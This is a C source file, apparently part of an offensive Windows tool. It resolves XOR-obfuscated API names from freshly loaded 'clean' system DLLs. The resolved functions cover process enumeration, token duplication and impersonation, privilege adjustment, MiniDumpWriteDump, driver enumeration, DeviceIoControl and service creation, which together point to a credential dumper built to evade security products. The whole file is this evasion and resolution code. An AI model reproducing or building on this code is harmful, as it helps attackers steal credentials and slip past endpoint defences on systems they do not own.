#include "api.h"
#include "utils.h"
#include "logger.h"
#include "defs.h"
#include "api_strings.h"

#define DECL_API_PTR(name) PFN_##name p##name = NULL

DECL_API_PTR(P32F);
DECL_API_PTR(P32N);
DECL_API_PTR(OP);
DECL_API_PTR(GPA);
DECL_API_PTR(NTCPX);
DECL_API_PTR(CTH);
DECL_API_PTR(OPTK);
DECL_API_PTR(DUPTOK);
DECL_API_PTR(IMP);
DECL_API_PTR(STT);
DECL_API_PTR(ATP);
DECL_API_PTR(LPVA);
DECL_API_PTR(MDWD);
DECL_API_PTR(GPID);
DECL_API_PTR(GCP);
DECL_API_PTR(CFA);
DECL_API_PTR(DIOC);
DECL_API_PTR(LLW);
DECL_API_PTR(EDD);
DECL_API_PTR(OSCM);
DECL_API_PTR(CS);
DECL_API_PTR(OS);
DECL_API_PTR(SS);
DECL_API_PTR(CSVC);
DECL_API_PTR(DS);
DECL_API_PTR(CSH);

// internal function to resolve APIs
static BOOL ResolveApiFromDll(HMODULE hMod, const unsigned char* enc, size_t len, void** fn) {
    char* name = xor_decrypt_string(enc, len, XOR_KEY, key_len);
    if (!name) return FALSE;

    *fn = (void*)CustomGetProcAddress(hMod, name);
    /* DEBUG
    if (*fn == NULL) {
        log_error("Failed to resolve API '%s' from module %p", name, hMod);
    }
    else {
        log_info("Successfully resolved API '%s' from module %p at address %p", name, hMod, *fn);
    }
    */
    free(name);
    return (*fn != NULL);
}

// resolve all required APIs
BOOL ResolveAllApis(void) {
    HMODULE hKernel32 = LoadCleanDLL("kernel32.dll");
    HMODULE hNtdll = LoadCleanDLL("ntdll.dll");
    HMODULE hAdvapi32 = LoadCleanDLL("advapi32.dll");
    HMODULE hDbghelp = LoadCleanDLL("dbghelp.dll");
    HMODULE hPsapi = LoadCleanDLL("psapi.dll");

    if ( !hKernel32 || !hNtdll || !hAdvapi32 || !hDbghelp || !hPsapi) {
        log_error("Failed to load required DLLs.");
        return FALSE;
    }

    BOOL success =
        ResolveApiFromDll(hKernel32, P32F_ENC, sizeof(P32F_ENC), (void**)&pP32F) &&
        ResolveApiFromDll(hKernel32, P32N_ENC, sizeof(P32N_ENC), (void**)&pP32N) &&
        ResolveApiFromDll(hKernel32, OP_ENC, sizeof(OP_ENC), (void**)&pOP) &&
        ResolveApiFromDll(hKernel32, GPA_ENC, sizeof(GPA_ENC), (void**)&pGPA) &&
        ResolveApiFromDll(hNtdll, NTCPE_ENC, sizeof(NTCPE_ENC), (void**)&pNTCPX) &&
        ResolveApiFromDll(hKernel32, CTH_ENC, sizeof(CTH_ENC), (void**)&pCTH) &&
        ResolveApiFromDll(hAdvapi32, OPTK_ENC, sizeof(OPTK_ENC), (void**)&pOPTK) &&
        ResolveApiFromDll(hAdvapi32, DUPTOK_ENC, sizeof(DUPTOK_ENC), (void**)&pDUPTOK) &&
        ResolveApiFromDll(hAdvapi32, IMP_ENC, sizeof(IMP_ENC), (void**)&pIMP) &&
        ResolveApiFromDll(hAdvapi32, STT_ENC, sizeof(STT_ENC), (void**)&pSTT) &&
        ResolveApiFromDll(hAdvapi32, ATP_ENC, sizeof(ATP_ENC), (void**)&pATP) &&
        ResolveApiFromDll(hAdvapi32, LPVA_ENC, sizeof(LPVA_ENC), (void**)&pLPVA) &&
        ResolveApiFromDll(hDbghelp, MDWD_ENC, sizeof(MDWD_ENC), (void**)&pMDWD) &&
        ResolveApiFromDll(hKernel32, GPID_ENC, sizeof(GPID_ENC), (void**)&pGPID) &&
        ResolveApiFromDll(hKernel32, GCP_ENC, sizeof(GCP_ENC), (void**)&pGCP) &&
        ResolveApiFromDll(hKernel32, CFA_ENC, sizeof(CFA_ENC), (void**)&pCFA) &&
        ResolveApiFromDll(hKernel32, DIOC_ENC, sizeof(DIOC_ENC), (void**)&pDIOC)&&
        ResolveApiFromDll(hKernel32, LLW_ENC, sizeof(LLW_ENC), (void**)&pLLW)&&
        ResolveApiFromDll(hPsapi, EDD_ENC, sizeof(EDD_ENC), (void**)&pEDD)&&
        ResolveApiFromDll(hAdvapi32, OSCM_ENC, sizeof(OSCM_ENC), (void**)&pOSCM) &&
        ResolveApiFromDll(hAdvapi32, CS_ENC, sizeof(CS_ENC), (void**)&pCS) &&
        ResolveApiFromDll(hAdvapi32, OS_ENC, sizeof(OS_ENC), (void**)&pOS) &&
        ResolveApiFromDll(hAdvapi32, SS_ENC, sizeof(SS_ENC), (void**)&pSS) &&
        ResolveApiFromDll(hAdvapi32, CSVC_ENC, sizeof(CSVC_ENC), (void**)&pCSVC) &&
        ResolveApiFromDll(hAdvapi32, DS_ENC, sizeof(DS_ENC), (void**)&pDS) &&
        ResolveApiFromDll(hAdvapi32, CSH_ENC, sizeof(CSH_ENC), (void**)&pCSH);

    return success;
}
